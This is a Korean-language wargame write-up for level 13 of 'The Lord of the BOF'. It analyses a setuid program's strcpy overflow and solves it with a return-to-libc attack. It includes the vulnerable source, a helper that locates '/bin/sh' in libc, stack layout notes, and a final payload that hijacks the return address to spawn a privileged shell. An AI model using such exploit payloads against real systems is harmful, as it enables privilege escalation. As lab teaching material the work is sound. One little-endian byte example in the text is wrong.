---
title: BOF/ LOB-level13(darkknight)
tags: LOB
---

LOB란 The Lord of the BOF의 약자로 Buffer over-flow를 연습해 볼 수 있는 해킹문제이다.    
총 20문제로 구성되어 있으며 각 문제를 격파하여 다음 레벨의 패스워드를 얻는 형식이다.  
문제를 격파하고 다음 레벨의 bash를 획득하였다면 my-pass로 패스워드를 확인할 수 있다.  

 [send me email](mailto:jewel7492@gmail.com) if you have any questions.

<!--more-->

---
### LOB Level 13(darkknight)
**ID : darkknight**  
**PASSWD : new attacker**         

```bash
$ bash2
```
풀이 시작 전에 bash2로 꼭 변경  
**bash는 \xff를 \x00(NULL)로 인식하여 제대로 문제를 풀 수 없다.**  

![그림1](/assets/LOB/level13/1.png)  
사용자 bugbear의 권한의 bugbear파일이 있음을 확인할 수 있다.  
**set-uid가 걸려있으므로 사용자 bugbear의 권한으로 파일을 실행할 수 있다.**  
**bugbear파일이 쉘을 실행시키도록 한다면 사용자 bugbear의 쉘을 획득할 수 있다.**  

<br />
{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - bugbear
        - RTL1
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
                printf("stack betrayed you!!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
{% endhighlight %}  

**bugbear.c**

### 소스분석  
1. argc가 2보다 작다면 "ergv error"을 출력하고 프로그램을 종료한다.  
**argc란? - 파라미터의 개수를 의미한다. 즉 main에 최소 2개이상의 인자를 전달하여야 한다.**  
2. argv[1][47]의 값이 \xbf인 경우 "stack betrayed you!!"를 출력하고 프로그램을 종료한다.  
**기존의 공격에서는 argv[1][44]부터 argv[1][47]까지 buffer의 주소 또는 환경변수의 주소등 스택을 사용하였다.**  
**Stack은 0xbfffxxxx로 시작하기 때문에 Stack의 값을 이용하여 문제를 해결할 수 없다.**  
3. main에 전달받은 인자 argv[1]을 buffer에 복사하여 출력하는 소스(argv[0]은 파일명)  
**strcpy함수는 복사할 데이터의 크기제한이 없기 때문에 argv[1]이 40Byte보다 크다면 buffer-overflow가 발생하는 취약점이 있다.**  

### Solution  
**RTL(Return to Library)기법 사용**  
what is RTL?  
Return To Library 즉 라이브러리로 돌아가라! 라는 의미를 가지고 있다.  
main의 ret에 Library 함수의 주소를 덮는 방법으로 코드에서 사용하지 않는 함수를 실행시킬 수 있으며 인자전달 또한 가능하다.  
**ret에 system함수의 주소를 덮어 system함수가 /bin/sh를 실행하도록 프로그램 흐름을 조작**  

**RTL을 사용하는 이유?**  
DEP(Data Execution Protection)라는 방어기법 때문에 RTL을 사용하는데 DEP란 스택,힙 같은 영역에 있는 코드가  
w권한 x권한을 동시에 갖지않도록 차단하는 기법이다.  


![그림2](/assets/LOB/level13/2.png)  
gdb로 분석할 때 권한으로부터 자유롭기 위해 bugbear를 복사한다.  

### disassemble  

**스택구조를 파악하기 위해 디버깅을 한다.**  
권한문제가 없도록 gremlin를 복사하고 gdb를 사용하여 intel방식으로 디스어셈블 한다.  
![그림3](/assets/LOB/level13/3.png)  
disassemble 결과  
**ESP -= 44의 연산이 이루진 것을 보아 buf(40) + i(4) 의 공간이 푸쉬됨을 알 수 있다. dummy없음**  

스택구조|
---|
i(4Byte)|
buffer(40Byte)|
sfp(4Byte)|
ret(4Byte)| 

![그림4](/assets/LOB/level13/4.png)  
print명령어를 사용해 system함수의 주소를 확인한다.

<br />
{% highlight C linenos %}  
#include <stdio.h>

int main(){
    long sysaddr = 0x40058ae0;
    while(memcmp((void*) sysaddr, "/bin/sh", 8)){
        sysaddr++;
    }

    printf("/bin/sh address : %p\n", sysaddr);
    return 0;
}
{% endhighlight %}  
**sysaddr에 system함수의 주소를 대입하고 memcmp함수를 사용해 system함수의 시작주소부터 /bin/sh를 찾을때까지 반복하는 프로그램을 작성한다.**   
system 함수는 어떤 명령을 실행시킬때 /bin/sh 를 실행시켜 원하는 명령을 실행시킨다. 따라서 /bin/sh를 찾을 수 있는것.  

![그림5](/assets/LOB/level13/5.png)  
작성한 소스를 컴파일하여 실행하면 system함수에 대한 /bin/sh주소를 획득할 수 있다.  

![그림6](/assets/LOB/level13/6.png)  
dummy(4) + 인자(4)  
**system함수로 실행할 명령을 인자로 전달할 때 dummy 4byte와 함께 전달해야함을 알 수 있다.**  

### Attack  

system함수의 주소, /bin/sh의 주소, 스택의 구조를 파악하였으므로 공격을 시도할 수 있다.  
**./bugbear [dummy(44)] + [system주소(4)] + [dummy(4)] + [/bin/sh주소]**의 형태로 공격.  
**쉽게말해 프로그램이 system함수를 실행하도록 공격하는데, system함수가 /bin/sh를 실행하도록 인자를 전달한 것이다.**  
**또한 RET에 덮을 system의 주소와 system함수에 전달한 /bin/sh의 주소는 리틀 엔디안 방식으로 기입한다.**  

**리틀 엔디안은 최 하위 바이트 부터 저장하는 방식이다.**  
ex) 0xbffffc11을 리틀 엔디안 방식으로 저장하면 11cfffbf가 된다.  
보통 엔디안 방식은 CPU 아키텍쳐에 따라 다르지만 intel x86, x64, AMD 계열은 리틀엔디안, 모토로라 프로세서들은 빅엔디안을 사용한다.  
현재 시스템의 엔디안방식을 확인하고 싶다면 echo -n I | od -to2 | head -n1 | awk'{print $2;}' | cut -c6  
명령으로 나오는 값이 1이라면 리틀 엔디안, 0이라면 빅엔디안이다.  

![그림7](/assets/LOB/level13/7.png)  
**페이로드**  
```bash
./bugbear `python -c "print 'A'*44 + '\xe0\x8a\x05\x40' + 'A'*4 + '\xf9\xbf\x0f\x40'"`
```
공격 성공  